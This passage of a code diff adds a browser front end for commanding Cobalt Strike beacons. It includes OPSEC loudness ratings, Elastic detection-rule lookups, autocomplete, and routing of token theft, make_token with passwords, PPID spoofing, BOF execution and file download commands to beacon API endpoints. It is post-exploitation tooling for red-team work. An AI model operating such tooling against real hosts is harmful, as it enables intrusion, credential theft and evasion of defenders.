+            this._opsecLastCmd = base;
+        }
+        const level = entry.opsec || 'safe';
+        const icons = { safe: '', moderate: '\u26a0\ufe0f', loud: '\ud83d\udea8' };
+        const labels = { safe: 'SAFE', moderate: 'MODERATE', loud: 'LOUD' };
+        let apiTag = '';
+        if (entry.api === 'dedicated') apiTag = '<span class="opsec-live-api">API: dedicated endpoint</span>';
+        else if (entry.api === 'console') apiTag = '<span class="opsec-live-api">API: via consoleCommand</span>';
+        else if (entry.api === 'none') apiTag = '<span class="opsec-live-api">\u26d4 Not available via REST API</span>';
+        const noteHtml = entry.note ? `<span class="opsec-live-note">\u2014 ${this.escapeHtml(entry.note)}</span>` : '';
+        const hasDetail = entry.detect || entry.alt || entry.prereqs || entry.mitigations || entry.eventIds;
+        // Chevron indicator (only if enrichment data exists)
+        let chevronHtml = '';
+        if (hasDetail) {
+            const chevronClass = (level === 'loud' || this._opsecDetailOpen) ? ' rotated' : '';
+            chevronHtml = `<span class="opsec-detail-toggle"><span class="opsec-chevron${chevronClass}">\u25bc</span></span>`;
+        }
+        // Entire compact row is clickable to toggle detail panel
+        const clickAttr = hasDetail ? ' onclick="BEACON._toggleOpsecDetail()" style="cursor: pointer;"' : '';
+        // Staleness indicator for Elastic rules
+        let staleHtml = '';
+        if (typeof ELASTIC_RULES !== 'undefined' && ELASTIC_RULES.meta?.last_updated && hasDetail) {
+            const days = Math.floor((Date.now() - new Date(ELASTIC_RULES.meta.last_updated)) / 86400000);
+            if (days > 30) staleHtml = `<span class="opsec-stale opsec-stale--red" title="Elastic rules ${days} days old">Rules: ${days}d old</span>`;
+            else if (days > 14) staleHtml = `<span class="opsec-stale opsec-stale--amber" title="Elastic rules ${days} days old">Rules: ${days}d old</span>`;
+        }
+        const compactHtml = `${icons[level]} <span class="opsec-live-label">OPSEC: ${labels[level]}</span>${noteHtml}${apiTag}${staleHtml}${chevronHtml}`;
+        // Build detail panel (auto-expand for loud, collapsed for moderate)
+        let detailHtml = '';
+        if (hasDetail) {
+            const showDetail = level === 'loud' || this._opsecDetailOpen;
+            detailHtml = `<div class="opsec-live-detail" style="display: ${showDetail ? 'block' : 'none'};">${this._buildOpsecDetailHtml(entry)}</div>`;
+        }
+        bar.className = `opsec-live-bar visible opsec-${level}`;
+        bar.innerHTML = `<div class="opsec-live-compact"${clickAttr}>${compactHtml}</div>${detailHtml}`;
+    },
+
+    _buildOpsecDetailHtml(entry) {
+        let html = '<div class="opsec-detail-grid">';
+        // Left column: detections + prerequisites
+        html += '<div class="opsec-detail-col">';
+        if (entry.detect?.length) {
+            html += '<div class="opsec-detail-section"><span class="opsec-detail-heading">Detections</span>';
+            entry.detect.forEach(d => { html += `<div class="opsec-detail-item opsec-detail-detect">${this.escapeHtml(d)}</div>`; });
+            html += '</div>';
+        }
+        if (entry.prereqs?.length) {
+            html += '<div class="opsec-detail-section"><span class="opsec-detail-heading">Prerequisites</span>';
+            entry.prereqs.forEach(p => { html += `<div class="opsec-detail-item opsec-detail-prereq">${this.escapeHtml(p)}</div>`; });
+            html += '</div>';
+        }
+        html += '</div>';
+        // Right column: alternatives + mitigations
+        html += '<div class="opsec-detail-col">';
+        if (entry.alt?.length) {
+            html += '<div class="opsec-detail-section"><span class="opsec-detail-heading">Safer Alternatives</span>';
+            entry.alt.forEach(a => {
+                html += `<div class="opsec-detail-alt" onclick="BEACON._useAlternative('${this.escapeAttr(a.cmd)}')">`
+                      + `<span class="opsec-alt-cmd">${this.escapeHtml(a.cmd)}</span>`
+                      + `<span class="opsec-alt-why">${this.escapeHtml(a.why)}</span></div>`;
+            });
+            html += '</div>';
+        }
+        if (entry.mitigations?.length) {
+            html += '<div class="opsec-detail-section"><span class="opsec-detail-heading">Mitigations</span>';
+            entry.mitigations.forEach(m => { html += `<div class="opsec-detail-item opsec-detail-mitigation">${this.escapeHtml(m)}</div>`; });
+            html += '</div>';
+        }
+        html += '</div></div>';
+        // Event IDs row
+        if (entry.eventIds?.length) {
+            html += '<div class="opsec-detail-events"><span class="opsec-detail-heading">Event IDs</span> ';
+            entry.eventIds.forEach(id => { html += `<span class="opsec-event-badge">${id}</span>`; });
+            html += '</div>';
+        }
+        // Elastic detection rules (contextual matching on full input)
+        const inputEl = document.getElementById('beacon-command-input');
+        const inputVal = inputEl?.value || entry.cmd || '';
+        const elasticRules = this._matchElasticRules(inputVal);
+        if (elasticRules.length) {
+            html += this._buildElasticHtml(elasticRules);
+        } else if (entry.opsec === 'loud' || entry.opsec === 'moderate') {
+            html += '<div class="opsec-elastic-section">';
+            html += '<span class="opsec-detail-heading">Elastic Detections</span>';
+            html += '<div class="opsec-elastic-nocover">No Elastic SIEM rules mapped \u2014 network-layer or behavioral detection may still apply</div>';
+            html += '</div>';
+        }
+        return html;
+    },
+
+    _toggleOpsecDetail() {
+        const detail = document.querySelector('.opsec-live-detail');
+        const chevron = document.querySelector('.opsec-chevron');
+        if (!detail) return;
+        this._opsecDetailOpen = !this._opsecDetailOpen;
+        detail.style.display = this._opsecDetailOpen ? 'block' : 'none';
+        if (chevron) chevron.classList.toggle('rotated', this._opsecDetailOpen);
+    },
+
+    _useAlternative(cmd) {
+        const input = document.getElementById('beacon-command-input');
+        if (!input) return;
+        input.value = cmd + ' ';
+        input.focus();
+        this._updateOpsecBar(cmd);
+        this.hideAutocomplete();
+    },
+
+    // --- Elastic Detection Rules Matching (two-tier contextual) ---
+    _matchElasticRules(inputValue) {
+        if (typeof ELASTIC_RULES === 'undefined') return [];
+        const parts = inputValue.trim().split(/\s+/);
+        const base = parts[0]?.toLowerCase();
+        const args = parts.slice(1).join(' ').toLowerCase();
+        const seen = new Set();
+        const results = [];
+        const addRules = (rules) => {
+            if (!rules) return;
+            rules.forEach(r => { if (!seen.has(r.filename)) { seen.add(r.filename); results.push(r); } });
+        };
+        // Tier 1: Base command match
+        addRules(ELASTIC_RULES.commands?.[base]);
+        // Tier 2: Tool name match (scan args for known tool names)
+        if (args && ELASTIC_RULES.tools) {
+            for (const [tool, rules] of Object.entries(ELASTIC_RULES.tools)) {
+                if (args.includes(tool)) addRules(rules);
+            }
+        }
+        // Tier 2b: Keyword match
+        if (args && ELASTIC_RULES.keywords) {
+            for (const [kw, rules] of Object.entries(ELASTIC_RULES.keywords)) {
+                if (args.includes(kw)) addRules(rules);
+            }
+        }
+        results.sort((a, b) => (b.risk || 0) - (a.risk || 0));
+        return results;
+    },
+
+    _buildElasticHtml(rules) {
+        if (!rules.length) return '';
+        const baseUrl = (typeof ELASTIC_RULES !== 'undefined' && ELASTIC_RULES.meta?.base_url) || 'https://github.com/elastic/detection-rules/blob/main/rules/windows/';
+        const MAX_SHOW = 5;
+        const buildCard = (r) => {
+            const sev = r.severity || 'low';
+            const url = baseUrl + this.escapeAttr(r.filename);
+            return `<div class="opsec-elastic-card opsec-elastic-card--${sev}">`
+                + `<div class="opsec-elastic-header">`
+                + `<span class="opsec-elastic-severity">${this.escapeHtml(sev)} (${r.risk || '?'})</span>`
+                + `<span class="opsec-elastic-name" title="${this.escapeAttr(r.name)}">${this.escapeHtml(r.name)}</span>`
+                + `<a class="opsec-elastic-link" href="${url}" target="_blank" rel="noopener" onclick="event.stopPropagation()">\u2197</a>`
+                + `</div>`
+                + `<div class="opsec-elastic-mitre">${this.escapeHtml(r.mitre_technique || '')} ${this.escapeHtml(r.mitre_technique_name || '')} \u00b7 ${this.escapeHtml(r.mitre_tactic_name || '')}</div>`
+                + `<div class="opsec-elastic-query">${this.escapeHtml(r.query_summary || '')}</div>`
+                + `</div>`;
+        };
+        let html = '<div class="opsec-elastic-section">';
+        html += `<span class="opsec-detail-heading">Elastic Detections (${rules.length})</span>`;
+        const visible = rules.slice(0, MAX_SHOW);
+        const hidden = rules.slice(MAX_SHOW);
+        visible.forEach(r => { html += buildCard(r); });
+        if (hidden.length) {
+            const hiddenId = 'elastic-hidden-' + Date.now();
+            html += `<div id="${hiddenId}" style="display:none;">`;
+            hidden.forEach(r => { html += buildCard(r); });
+            html += '</div>';
+            html += `<button class="opsec-elastic-expand" onclick="event.stopPropagation(); var el=document.getElementById('${hiddenId}'); el.style.display=el.style.display==='none'?'block':'none'; this.textContent=el.style.display==='none'?'Show all ${rules.length} rules \u25bc':'Show less \u25b2'">Show all ${rules.length} rules \u25bc</button>`;
+        }
+        html += '</div>';
+        return html;
+    },
+
+    // --- Command History (per beacon) ---
+    _cmdHistoryKey(bid) {
+        const dep = this.selectedDeployment?._filename || 'default';
+        return `beacon-cmdhist-${dep}-${bid}`;
+    },
+
+    _loadCmdHistory(bid) {
+        try {
+            const raw = localStorage.getItem(this._cmdHistoryKey(bid));
+            return raw ? JSON.parse(raw) : [];
+        } catch (e) { return []; }
+    },
+
+    _saveCmdHistory(bid) {
+        try {
+            // Keep last 200 commands
+            const hist = this.cmdHistory.slice(-200);
+            localStorage.setItem(this._cmdHistoryKey(bid), JSON.stringify(hist));
+        } catch (e) { /* storage full */ }
+    },
+
+    // --- Autocomplete ---
+    showAutocomplete(query) {
+        const dropdown = document.getElementById('cmd-autocomplete');
+        if (!dropdown) return;
+        if (!query) { this.hideAutocomplete(); return; }
+
+        const q = query.toLowerCase();
+        const matches = this.CS_COMMANDS.filter(c => c.cmd.startsWith(q)).slice(0, 12);
+        if (matches.length === 0 || (matches.length === 1 && matches[0].cmd === q)) {
+            this.hideAutocomplete();
+            return;
+        }
+
+        this.acItems = matches;
+        this.acIdx = -1;
+        dropdown.innerHTML = matches.map((m, i) => {
+            let tags = '';
+            if (m.api === 'none') tags += ' <span class="opsec-warning opsec-warning--noapi">N/A</span>';
+            if (m.opsec === 'loud') tags += ' <span class="opsec-warning opsec-warning--loud">LOUD</span>';
+            else if (m.opsec === 'moderate') tags += ' <span class="opsec-warning opsec-warning--moderate">MOD</span>';
+            // Detection/alternative preview line for enriched commands
+            let detailLine = '';
+            const hasEnrichment = m.detect || m.alt;
+            if (hasEnrichment) {
+                const parts = [];
+                if (m.detect?.[0]) {
+                    const t = m.detect[0].length > 55 ? m.detect[0].slice(0, 55) + '\u2026' : m.detect[0];
+                    parts.push(`<span class="ac-detect">${this.escapeHtml(t)}</span>`);
+                }
+                if (m.alt?.[0]) {
+                    parts.push(`<span class="ac-alt">use ${this.escapeHtml(m.alt[0].cmd)}</span>`);
+                }
+                if (parts.length) detailLine = `<div class="ac-detail-line">${parts.join(' <span class="ac-sep">|</span> ')}</div>`;
+            }
+            return `<div class="cmd-autocomplete-item${hasEnrichment ? ' has-detail' : ''}" data-idx="${i}" onclick="BEACON.acceptAutocomplete(${i}, true)"><div class="ac-main-line">${this.escapeHtml(m.cmd)}<span class="cmd-hint">${this.escapeHtml(m.hint)}</span>${tags}</div>${detailLine}</div>`;
+        }).join('');
+        dropdown.style.display = 'block';
+        this.acVisible = true;
+    },
+
+    hideAutocomplete() {
+        const dropdown = document.getElementById('cmd-autocomplete');
+        if (dropdown) dropdown.style.display = 'none';
+        this.acVisible = false;
+        this.acIdx = -1;
+    },
+
+    acceptAutocomplete(idx, andClose) {
+        const item = this.acItems[idx];
+        if (!item) return;
+        const input = document.getElementById('beacon-command-input');
+        if (input) {
+            const parts = input.value.split(/\s+/);
+            parts[0] = item.cmd;
+            input.value = parts.join(' ') + (parts.length === 1 ? ' ' : '');
+            input.focus();
+            this._updateOpsecBar(input.value);
+        }
+        if (andClose) this.hideAutocomplete();
+    },
+
+    // --- Input Keydown Handler (history, autocomplete, enter) ---
+    handleInputKeydown(e) {
+        const input = document.getElementById('beacon-command-input');
+        if (!input) return;
+
+        // Tab: autocomplete — cycle through matches, keep dropdown open
+        if (e.key === 'Tab') {
+            e.preventDefault();
+            if (this.acVisible && this.acItems.length > 0) {
+                this.acIdx = (this.acIdx + 1) % this.acItems.length;
+                document.querySelectorAll('.cmd-autocomplete-item').forEach((el, i) => {
+                    el.classList.toggle('active', i === this.acIdx);
+                });
+                this.acceptAutocomplete(this.acIdx, false);
+            } else {
+                const firstWord = input.value.split(/\s+/)[0];
+                this.showAutocomplete(firstWord);
+                if (this.acItems.length === 1) {
+                    this.acIdx = 0;
+                    this.acceptAutocomplete(0, true);
+                } else if (this.acItems.length > 1) {
+                    this.acIdx = 0;
+                    document.querySelectorAll('.cmd-autocomplete-item').forEach((el, i) => {
+                        el.classList.toggle('active', i === 0);
+                    });
+                    this.acceptAutocomplete(0, false);
+                }
+            }
+            return;
+        }
+
+        // Escape: close autocomplete
+        if (e.key === 'Escape') {
+            this.hideAutocomplete();
+            return;
+        }
+
+        // Up/Down: command history
+        if (e.key === 'ArrowUp') {
+            e.preventDefault();
+            if (this.acVisible) {
+                // Navigate autocomplete
+                this.acIdx = Math.max(0, this.acIdx - 1);
+                document.querySelectorAll('.cmd-autocomplete-item').forEach((el, i) => el.classList.toggle('active', i === this.acIdx));
+                return;
+            }
+            if (this.cmdHistory.length === 0) return;
+            if (this.cmdHistoryIdx === -1) this.cmdDraft = input.value;
+            this.cmdHistoryIdx = Math.min(this.cmdHistoryIdx + 1, this.cmdHistory.length - 1);
+            input.value = this.cmdHistory[this.cmdHistory.length - 1 - this.cmdHistoryIdx];
+            return;
+        }
+        if (e.key === 'ArrowDown') {
+            e.preventDefault();
+            if (this.acVisible) {
+                this.acIdx = Math.min(this.acItems.length - 1, this.acIdx + 1);
+                document.querySelectorAll('.cmd-autocomplete-item').forEach((el, i) => el.classList.toggle('active', i === this.acIdx));
+                return;
+            }
+            if (this.cmdHistoryIdx <= 0) {
+                this.cmdHistoryIdx = -1;
+                input.value = this.cmdDraft;
+                return;
+            }
+            this.cmdHistoryIdx--;
+            input.value = this.cmdHistory[this.cmdHistory.length - 1 - this.cmdHistoryIdx];
+            return;
+        }
+
+        // Enter: send command
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            this.hideAutocomplete();
+            this.sendCommand();
+            return;
+        }
+
+        // Any other key: update autocomplete + live OPSEC bar
+        setTimeout(() => {
+            const val = input.value;
+            const firstWord = val.split(/\s+/)[0];
+            if (val.includes(' ')) {
+                this.hideAutocomplete();
+            } else {
+                this.showAutocomplete(firstWord);
+            }
+            this._updateOpsecBar(val);
+        }, 0);
+    },
+
+    _historyKey(bid) {
+        const dep = this.selectedDeployment?._filename || 'default';
+        return `beacon-history-${dep}-${bid}`;
+    },
+
+    _saveHistory(bid) {
+        const output = document.getElementById('beacon-command-output');
+        if (!output || !bid) return;
+        try {
+            const key = this._historyKey(bid);
+            const html = output.innerHTML;
+            // Cap at 500KB per beacon to avoid localStorage limits
+            localStorage.setItem(key, html.length > 512000 ? html.slice(-512000) : html);
+        } catch (e) { /* storage full — silently fail */ }
+    },
+
+    _loadHistory(bid) {
+        try { return localStorage.getItem(this._historyKey(bid)) || ''; }
+        catch (e) { return ''; }
+    },
+
+    selectBeacon(bid, label) {
+        // Save current beacon's history before switching
+        if (this.selectedBid && this.selectedBid !== bid) {
+            this._saveHistory(this.selectedBid);
+            this._saveCmdHistory(this.selectedBid);
+        }
+        this.selectedBid = bid;
+
+        // Load command history for this beacon
+        this.cmdHistory = this._loadCmdHistory(bid);
+        this.cmdHistoryIdx = -1;
+        this.cmdDraft = '';
+
+        const panel = document.getElementById('beacon-interact-panel');
+        const labelEl = document.getElementById('interact-beacon-label');
+        const output = document.getElementById('beacon-command-output');
+        const input = document.getElementById('beacon-command-input');
+
+        if (panel) {
+            panel.style.display = 'block';
+            panel.classList.add('interact-fullview');
+            this._initDragBar();
+        }
+        if (labelEl) labelEl.textContent = `${label} (${bid})`;
+
+        // Render metadata badges and process context bar
+        this.renderMetaBadges(bid);
+        this.renderProcessContext(bid);
+
+        // Fetch fresh beacon detail (updates context bar with process/arch/ppid)
+        this.refreshBeaconDetail(bid, false);
+
+        // Restore saved output history or show fresh prompt
+        const saved = this._loadHistory(bid);
+        if (saved && output) {
+            output.innerHTML = saved;
+            output.scrollTop = output.scrollHeight;
+        } else if (output) {
+            output.innerHTML = `<span class="t-terminal">Interacting with beacon ${this.escapeHtml(bid)}. Enter a command below.</span>`;
+        }
+        if (input) { input.value = ''; input.focus(); }
+
+        // Start live task feed (shows commands from ALL sources — UI, CLI, CS client)
+        this.startTaskFeed(bid);
+
+        // Restore cached file browser for this beacon
+        this._restoreFileBrowser();
+
+        document.querySelectorAll('.beacon-table tbody tr').forEach(tr => {
+            tr.classList.toggle('selected', tr.dataset.bid === bid);
+        });
+    },
+
+    closeInteract() {
+        this.stopTaskFeed();
+        this.stopActivityLogPoll();
+        // Save history before closing
+        if (this.selectedBid) {
+            this._saveHistory(this.selectedBid);
+            this._saveCmdHistory(this.selectedBid);
+        }
+        this.selectedBid = null;
+        this.hideAutocomplete();
+        const panel = document.getElementById('beacon-interact-panel');
+        if (panel) {
+            panel.classList.remove('interact-fullview');
+            panel.style.display = 'none';
+        }
+        // Reset process context bar
+        const ctx = document.getElementById('beacon-process-context');
+        if (ctx) ctx.innerHTML = '<span class="t-terminal" style="font-size: 0.82em; opacity: 0.5;">No beacon selected</span>';
+        document.querySelectorAll('.beacon-table tbody tr').forEach(tr => tr.classList.remove('selected'));
+    },
+
+    // --- Interact Panel Drag Resize ---
+    _initDragBar() {
+        const bar = document.getElementById('interact-drag-bar');
+        if (!bar || bar._dragInit) return;
+        bar._dragInit = true;
+        let startY, startTop;
+        const panel = document.getElementById('beacon-interact-panel');
+        const MIN_TOP = 52;   // nav bar height
+        const MAX_TOP = Math.round(window.innerHeight * 0.7);
+
+        bar.addEventListener('mousedown', (e) => {
+            e.preventDefault();
+            startY = e.clientY;
+            startTop = panel.getBoundingClientRect().top;
+            bar.classList.add('dragging');
+            document.body.style.cursor = 'ns-resize';
+            document.body.style.userSelect = 'none';
+
+            const onMove = (e) => {
+                const delta = e.clientY - startY;
+                const newTop = Math.max(MIN_TOP, Math.min(MAX_TOP, startTop + delta));
+                panel.style.top = newTop + 'px';
+            };
+            const onUp = () => {
+                document.removeEventListener('mousemove', onMove);
+                document.removeEventListener('mouseup', onUp);
+                bar.classList.remove('dragging');
+                document.body.style.cursor = '';
+                document.body.style.userSelect = '';
+                // Save position
+                try { localStorage.setItem('interact-panel-top', panel.style.top); } catch (e) {}
+            };
+            document.addEventListener('mousemove', onMove);
+            document.addEventListener('mouseup', onUp);
+        });
+
+        // Restore saved position
+        try {
+            const saved = localStorage.getItem('interact-panel-top');
+            if (saved && panel) panel.style.top = saved;
+        } catch (e) {}
+    },
+
+    // ── Command Routing: maps commands to dedicated REST API endpoints ──
+    // Falls back to consoleCommand for anything not explicitly routed.
+    _routeCommand(command) {
+        const parts = command.trim().split(/\s+/);
+        const base = parts[0]?.toLowerCase();
+        const args = parts.slice(1).join(' ');
+        const bid = this.selectedBid;
+        const fallback = { url: `/api/beacon/${bid}/command`, body: { command } };
+
+        // BOF Execution — inline-execute requires dedicated endpoint (not consoleCommand)
+        if (base === 'inline-execute') {
+            if (parts.length < 2) {
+                // No BOF specified — return a pseudo-error that sendCommand will display
+                return { url: `/api/beacon/${bid}/bof/execute`, body: { bof: '', method: 'string' } };
+            }
+            const bofPath = parts[1];
+            const bofArgs = parts.slice(2).join(' ');
+            // @artifacts/ for team server artifacts, @files/ for uploaded, or raw path
+            const bofRef = bofPath.startsWith('@') ? bofPath : `@artifacts/${bofPath}`;
+            return {
+                url: `/api/beacon/${bid}/bof/execute`,
+                body: { bof: bofRef, entrypoint: 'go', arguments: bofArgs, method: 'string' },
+            };
+        }
+
+        // Beacon Gate
+        if (base === 'beacongate' || (base === 'beacon_gate')) {
+            if (args === 'enable') return { url: `/api/beacon/${bid}/config/beacongate/enable`, body: {} };
+            if (args === 'disable') return { url: `/api/beacon/${bid}/config/beacongate/disable`, body: {} };
+        }
+
+        // Syscall method
+        if (base === 'syscall_method' && args) {
+            return { url: `/api/beacon/${bid}/config/syscall`, body: { method: args } };
+        }
+
+        // Sleep — use dedicated endpoint (value in seconds, not ms)
+        if (base === 'sleep' && parts.length >= 2) {
+            const sleepSec = parseInt(parts[1]) || 60;
+            const jitter = parseInt(parts[2]) || 0;
+            return { url: `/api/beacon/${bid}/sleep`, body: { sleep: sleepSec, jitter } };
+        }
+
+        // Beacon management
+        if (base === 'checkin') return { url: `/api/beacon/${bid}/checkin`, body: {} };
+        if (base === 'clear') return { url: `/api/beacon/${bid}/clear-queue`, body: {} };
+        if (base === 'beacon_info') return { url: `/api/beacon/${bid}/info`, body: {} };
+        if (base === 'exit') return { url: `/api/beacon/${bid}/command`, body: { command: 'exit' } };
+        if (base === 'note' && args) return { url: `/api/beacon/${bid}/note`, body: { note: args } };
+
+        // Token store commands
+        if (base === 'token_store') {
+            if (parts[1] === 'list') return { url: `/api/beacon/${bid}/tokenstore/list`, body: {} };
+            if (parts[1] === 'steal' && parts[2]) return { url: `/api/beacon/${bid}/tokenstore/steal`, body: { pid: parseInt(parts[2]) } };
+            if (parts[1] === 'use' && parts[2]) return { url: `/api/beacon/${bid}/tokenstore/use`, body: { id: parseInt(parts[2]) } };
+            if (parts[1] === 'steal_and_use' && parts[2]) return { url: `/api/beacon/${bid}/tokenstore/steal-and-use`, body: { pid: parseInt(parts[2]) } };
+            if (parts[1] === 'remove' && parts[2]) return { url: `/api/beacon/${bid}/tokenstore/remove`, body: { ids: [parseInt(parts[2])] } };
+            if (parts[1] === 'remove_all') return { url: `/api/beacon/${bid}/tokenstore/remove-all`, body: {} };
+        }
+
+        // Spawnto — dedicated endpoint
+        if (base === 'spawnto' && parts.length >= 3) {
+            const arch = parts[1];
+            const path = parts.slice(2).join(' ');
+            return { url: `/api/beacon/${bid}/config/spawnto`, body: { arch, path } };
+        }
+
+        // PPID — dedicated endpoint
+        if (base === 'ppid' && parts[1]) {
+            return { url: `/api/beacon/${bid}/config/ppid`, body: { pid: parseInt(parts[1]) } };
+        }
+
+        // Blockdlls — dedicated endpoint
+        if (base === 'blockdlls') {
+            if (args === 'start') return { url: `/api/beacon/${bid}/config/blockdlls`, body: { enabled: true } };
+            if (args === 'stop') return { url: `/api/beacon/${bid}/config/blockdlls`, body: { enabled: false } };
+        }
+
+        // Argue — dedicated endpoint
+        if (base === 'argue' && parts.length >= 3) {
+            return { url: `/api/beacon/${bid}/config/argue`, body: { command: parts[1], args: parts.slice(2).join(' ') } };
+        }
+
+        // Rev2self, getuid, getprivs — dedicated endpoints
+        if (base === 'rev2self') return { url: `/api/beacon/${bid}/token/rev2self`, body: {} };
+        if (base === 'getuid') return { url: `/api/beacon/${bid}/getuid`, body: {} };
+
+        // Make token — dedicated endpoint
+        if (base === 'make_token' && parts.length >= 3) {
+            // Format: make_token DOMAIN\user password  OR  user@domain password
+            const identity = parts[1];
+            const password = parts.slice(2).join(' ');
+            let domain = '', user = '';
+            if (identity.includes('\\')) {
+                [domain, user] = identity.split('\\', 2);
+            } else if (identity.includes('@')) {
+                [user, domain] = identity.split('@', 2);
+            } else {
+                domain = '.';
+                user = identity;
+            }
+            return { url: `/api/beacon/${bid}/token/make`, body: { domain, user, password } };
+        }
+
+        // Steal token — dedicated endpoint
+        if (base === 'steal_token' && parts[1]) {
+            return { url: `/api/beacon/${bid}/token/steal`, body: { pid: parseInt(parts[1]) } };
+        }
+
+        // File operations — dedicated endpoints
+        if (base === 'ls') return { url: `/api/beacon/${bid}/fs/ls`, body: { path: args || null } };
+        if (base === 'cd' && args) return { url: `/api/beacon/${bid}/command`, body: { command } };
+        if (base === 'mkdir' && args) return { url: `/api/beacon/${bid}/fs/mkdir`, body: { path: args } };
+        if (base === 'rm' && args) return { url: `/api/beacon/${bid}/fs/rm`, body: { path: args } };
+        if (base === 'download' && args) return { url: `/api/beacon/${bid}/fs/download`, body: { path: args } };
+        if (base === 'drives') return { url: `/api/beacon/${bid}/fs/drives`, body: {} };
+
+        // Process ops
+        if (base === 'ps') return { url: `/api/beacon/${bid}/ps`, body: {} };
+        if (base === 'kill' && parts[1]) return { url: `/api/beacon/${bid}/kill`, body: { pid: parseInt(parts[1]) } };
+
+        // Default: consoleCommand fallback
+        return fallback;
+    },
+
+    async sendCommand() {
+        const input = document.getElementById('beacon-command-input');
+        const output = document.getElementById('beacon-command-output');
+        const command = input?.value?.trim();
+        if (!command || !this.selectedBid) return;
+
+        // Save to command history
+        if (!this.cmdHistory.length || this.cmdHistory[this.cmdHistory.length - 1] !== command) {
+            this.cmdHistory.push(command);
+        }
+        this.cmdHistoryIdx = -1;
+        this.cmdDraft = '';
+        this._saveCmdHistory(this.selectedBid);
+
+        // Timestamp + command echo + OPSEC warning
+        const ts = this._timestamp();
+        const opsecHtml = this._getOpsecWarning(command);
+        output.innerHTML += `<div class="task-card task-card--queued"><span style="color: var(--text-terminal); opacity: 0.6;">[${ts}]</span> <span style="color: var(--terminal-prompt);">beacon&gt;</span> <span style="color: var(--text-terminal);">${this.escapeHtml(command)}</span>${opsecHtml ? '\n' + opsecHtml : ''}`;
+        input.value = '';
+        this._updateOpsecBar('');
+
+        try {
+            // Route commands to dedicated endpoints when available
+            const routed = this._routeCommand(command);
+            const resp = await fetch(routed.url, {
+                method: routed.method || 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(routed.body),
+            });
+            const data = await resp.json();
+            if (data.success) {
+                const taskId = data.result?.taskId || data.data?.taskId;
+                if (taskId) {
+                    // Mark as known so task feed doesn't double-render
+                    this._taskFeedKnown.add(taskId);
+                    this._taskFeedPolling.add(taskId);
+                    output.innerHTML += `<span style="color: var(--terminal-info);">[*] Task ${taskId} queued</span>\n</div>`;
+                    this.pollTaskOutput(taskId, output);
+                } else {
+                    output.innerHTML += `<span style="color: var(--terminal-success);">[+] Command sent</span>\n</div>`;
+                }
+                // Re-fetch beacon detail after context-changing commands
+                if (this._isContextChangingCmd(command)) {
+                    setTimeout(() => this.refreshBeaconDetail(this.selectedBid, true), 5000);
+                }
+            } else {
+                const err = data.error || 'Command failed';
+                // Rewrite task card to error style
+                output.innerHTML = output.innerHTML.replace(/task-card--queued(?=[^"]*$)/, 'task-card--error');
+                output.innerHTML += `<span style="color: var(--terminal-danger);">[-] ${this.escapeHtml(err)}</span>\n`;
+                if (err.includes('not supported') || err.includes('400')) {
+                    const base = command.trim().split(/\s+/)[0]?.toLowerCase();
+                    if (base === 'inline-execute') {
+                        output.innerHTML += `<span style="color: var(--terminal-warning);">[!] Usage: inline-execute &lt;path/to/bof.o&gt; [args...]</span>\n`;
+                        output.innerHTML += `<span style="color: var(--terminal-info);">[*] BOF path can be: @artifacts/BOFs/bof.x64.o or a path on the team server</span>\n`;
+                    } else {
+                        output.innerHTML += `<span style="color: var(--terminal-warning);">[!] Not all CS commands are available via REST API. Try: shell ${this.escapeHtml(command)}</span>\n`;
+                    }
+                }
+                output.innerHTML += `</div>`;
+            }
+        } catch (e) {
+            output.innerHTML = output.innerHTML.replace(/task-card--queued(?=[^"]*$)/, 'task-card--error');
+            output.innerHTML += `<span style="color: var(--terminal-danger);">[-] Error: ${this.escapeHtml(e.message)}</span>\n</div>`;
+        }
+        output.scrollTop = output.scrollHeight;
+        this._saveHistory(this.selectedBid);
+    },
+
+    _shownAcks: new Set(), // track which task acknowledgements we've already displayed
+
+    async pollTaskOutput(taskId, outputEl, attempts = 0) {
+        // Bail if connection dropped or max attempts reached
+        if (this.connectionStatus !== 'connected' || attempts > 30) {
+            if (attempts > 30) {
+                const hasAcks = [...this._shownAcks].some(k => k.startsWith(taskId + ':'));
+                if (!hasAcks) {
+                    outputEl.innerHTML += `<span style="color: var(--terminal-warning);">[!] Task ${taskId} — timed out waiting for output</span>\n`;
+                }
+            }
+            return;
+        }
+
+        const delay = attempts < 5 ? 2000 : 5000;
+        await new Promise(r => setTimeout(r, delay));
+
+        try {
+            const resp = await fetch(`/api/beacon/task/${taskId}`);
+            const data = await resp.json();
+            if (data.success && data.task) {
+                const t = data.task;
+                const status = (t.taskStatus || t.status || '').toUpperCase();
+                const jid = t.jid;
+
+                // Activate tab output panel if it's a collapsible one
+                if (outputEl.classList.contains('tab-output-panel') && !outputEl.classList.contains('active')) {
+                    outputEl.classList.add('active');
+                }
+
+                // Show acknowledgements — matches CS client "[*] Tasked beacon to ..."
+                const acks = t.taskAcknowledgements || [];
+                acks.forEach(a => {
+                    const ackKey = taskId + ':' + (a.text || '');
+                    if (a.text && !this._shownAcks.has(ackKey)) {
+                        this._shownAcks.add(ackKey);
+                        // Skip ack text that is raw JSON (structured data rendered separately by formatTaskResult)
+                        if (a.text.startsWith('{') || a.text.startsWith('[')) return;
+                        outputEl.innerHTML += `<span style="color: var(--terminal-info);">[*] ${this.escapeHtml(a.text)}</span>\n`;
+                        // Show MITRE tactics if present
+                        if (a.tactics && a.tactics.length > 0) {
+                            outputEl.innerHTML += `<span style="color: var(--terminal-muted); font-size: 0.85em;">    MITRE: ${a.tactics.join(', ')}</span>\n`;
+                        }
+                    }
+                });
+
+                // Show callback confirmation when task transitions from queued — matches CS client "[+] host called home"
+                const callbackKey = taskId + ':callback';
+                if (t.updated && t.created && t.updated !== '1970-01-01T00:00:00Z' && !this._shownAcks.has(callbackKey)) {
+                    const created = new Date(t.created);
+                    const updated = new Date(t.updated);
+                    if (updated > created) {
+                        this._shownAcks.add(callbackKey);
+                        const callbackTime = updated.toLocaleTimeString();
+                        outputEl.innerHTML += `<span style="color: var(--terminal-success);">[+] host called home [${callbackTime}]</span>\n`;
+                        if (jid) {
+                            outputEl.innerHTML += `<span style="color: var(--terminal-success);">[+] job registered with id ${jid}</span>\n`;
+                        }
+                    }
+                }
+
+                if (status === 'OUTPUT_RECEIVED' || status === 'COMPLETED' || status === 'COMPLETE') {
+                    const results = t.result || t.results || [];
+                    if (Array.isArray(results) && results.length > 0) {
+                        results.forEach(r => {
+                            // Show with job context like CS client: "[+] [job 59] received output:"
+                            if (jid && r.output) {
